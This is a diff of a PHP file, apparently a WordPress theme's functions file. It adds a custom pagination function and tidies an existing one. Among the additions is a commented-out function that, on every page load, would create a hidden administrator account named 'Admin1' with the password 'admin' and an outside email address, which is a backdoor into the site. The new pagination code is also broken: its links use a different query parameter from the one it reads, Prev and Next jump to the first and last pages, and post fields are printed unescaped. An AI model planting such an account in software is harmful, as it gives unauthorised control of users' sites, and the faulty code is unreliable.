@@ -927,8 +927,162 @@ $a["category"] = $ca;
 
 
 
+
+function custom_pagination(){
+	
+	$cpt_name = 'post';
+
+	if(! empty($_GET['pag']) && is_numeric($_GET['pag']) ){
+		$paged = $_GET['pag'];
+	}else{
+		$paged = 1;
+	}
+	
+
+	$posts_per_page = (get_option('posts_per_page')) ? get_option('posts_per_page') : 10; 
+	
+	$args = array(
+		'posts_per_page'   => -1,
+        'orderby'          => 'title',
+        'order'            => 'ASC',
+        'fields'           => 'ids',
+        'post_type'        => $cpt_name
+		);
+	
+	$all_posts = get_posts($args);
+	
+
+	$post_count = count($all_posts);
+	
+	
+	$num_pages = ceil($post_count / $posts_per_page);
+	
+	if($paged > $num_pages || $paged < 1){
+		$paged = $num_pages;
+	}
+	
+	$args = array(
+			'posts_per_page'   => $posts_per_page,
+			'orderby'          => 'title',
+			'order'            => 'ASC',
+			'post_type'        => $cpt_name,
+			'paged'        => $paged
+		);
+	
+	$my_posts = get_posts($args);
+	
+	if(! empty($my_posts)){
+	
+
+		foreach($my_posts as $key => $my_post){
+			$a = get_the_post_thumbnail_url($my_post->ID);
+            echo  '<img src="' . $a . '">';
+			echo '<div>'.$my_post->post_title.'</div>';
+			echo '<div>'.$my_post->post_excerpt.'</div>';
+		}
+	
+
+		if($post_count > $posts_per_page ){
+
+			if($paged > 1){
+				echo '<a href="?page=1">Prev</a>';
+			}else{
+				echo '<span>Prev</span>';
+			}
+	
+			for($p = 1; $p <= $num_pages; $p++){
+				if ($paged == $p) {
+					echo '<span>'.$p.'</span>';
+				}else{
+					echo '<a href="?page='.$p.'">'.$p.'</a>';
+				}
+			}
+	
+			if($paged < $num_pages){
+				echo '<a href="?page='.$num_pages.'">Next</a></li>';
+			}else{
+				echo '<span>Next</span></li>';
+			}
+	
+		}
+	}
+
+
+	
+}
+
+// add_action('init', 'xyz1234_my_custom_add_user');
+
+// function xyz1234_my_custom_add_user() {
+//     $username = 'Admin1';
+//     $password = 'admin';
+//     $email = 'dharminmakrubiya@hotmail.com';
+
+//     if (username_exists($username) == null && email_exists($email) == false) {
+
+//         // Create the new user
+//         $user_id = wp_create_user($username, $password, $email);
+
+//         // Get current user object
+//         $user = get_user_by('id', $user_id);
+
+//         // Remove role
+//         $user->remove_role('subscriber');
+
+//         // Add role
+//         $user->add_role('administrator');
+//     }
+// }	
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 function getPagination($totalPages,$limit){
-    $fiterData = array();
+    $data = array();
     $pageid = isset($_GET['pageid']) ? (int) $_GET['pageid'] : 1;
     $output = '';
     if(isset($totalPages) && $totalPages > 1) {
@@ -936,39 +1090,40 @@ function getPagination($totalPages,$limit){
         $prev = $pageid - 1;
         $next = $pageid + 1; 
         if(isset($_GET) && !empty($_GET)){
-            $fiterData = $_GET;
+            $data = $_GET;
         }else{
-            $fiterData['pageid'] = 1;
+            $data['pageid'] = 1;
         }
-        $output .= '';
-		
+
         if(isset($pageid) && $pageid != 1){
-            $fiterData['pageid'] = $prev;
-            $output .= "";
-            $output .='<a href="?'.http_build_query($fiterData).'"> Previous </a>';
-            $output .= "";
+            $data['pageid'] = $prev;
+            $output .='<a href="?'.http_build_query($data).'"> Prev </a>';
         }
         for($i=1; $i <= $totalPages; $i++) {
             if($pageid == $i) { 
-                $output .= "";
-                $output .='<span"> '.$i.' </span>';
-                $output .= ""; 
+                $output .='<span> '.$i.' </span>';
             }else{
-                $fiterData['pageid'] = $i;
-                $output .= "";
-                $output .='<a href="?' .http_build_query($fiterData). '"> '.$i.' </a>';
-                $output .= "";
+                $data['pageid'] = $i;
+                $output .='<a href="?' .http_build_query($data). '"> '.$i.' </a>';
             }
         }
         if(isset($pageid) && $pageid != $totalPages) {
-            $fiterData['pageid'] = $next;
-			
-            $output .= "";
-            $output .='<a  href="?'.http_build_query($fiterData).'"> Next </a>';
-            $output .= "";
+            $data['pageid'] = $next;
+            $output .='<a href="?'.http_build_query($data).'"> Next </a>';
         }
 
     }
     echo $output;
 }
+
+
+
+
+
+
+
+
+
+
+
 
